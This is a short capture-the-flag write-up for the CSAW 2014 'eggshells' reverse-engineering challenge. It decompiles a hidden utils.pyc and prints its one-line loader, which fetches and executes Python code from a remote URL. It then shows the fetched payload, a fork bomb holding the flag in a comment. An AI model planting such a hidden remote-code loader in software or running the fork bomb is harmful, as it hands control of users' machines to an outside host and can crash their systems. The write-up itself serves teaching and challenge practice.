# CSAW CTF 2014: eggshells

**Category:** Reverse Engineering
**Points:** 100
**Description:**

> I trust people on the internet all the time, do you?
>
> Written by ColdHeat
>
> [eggshells-master.zip](eggshells-master.zip)

## Write-up

Let’s unzip [the provided zip file](eggshells-master.zip):

```bash
$ unzip eggshells-master.zip
```

This creates a directory `eggshells-master` that contains a bunch of Python files. One compiled Python file, `utils.pyc`, stands out. Let’s decompile it using [`uncompyle2`](https://github.com/wibiti/uncompyle2):

```bash
$ uncompyle2 utils.pyc
# 2014.09.22 10:53:48 CEST
#Embedded file name: /Users/kchung/Desktop/CSAW Quals 2014/rev100/utils.py
exec __import__('urllib2').urlopen('http://kchung.co/lol.py').read()
+++ okay decompyling utils.pyc
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
# 2014.09.22 10:53:48 CEST
```

That URL looks interesting.

```bash
$ curl 'http://kchung.co/lol.py'
import os
while True:
    try:
        os.fork()
    except:
        os.system('start')
# flag{trust_is_risky}
```

The flag is `trust_is_risky`.

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2014/09/csaw-ctf-quals-2014---eggshells-100pts-writeup>
* <http://bt3gl.github.io/csaw-ctf-2014-reverse-engineering-100-eggshells.html>
* <http://dhanvi1.wordpress.com/2014/10/07/csaw-ctf-quals-2014-eggshells-100-writeup/>
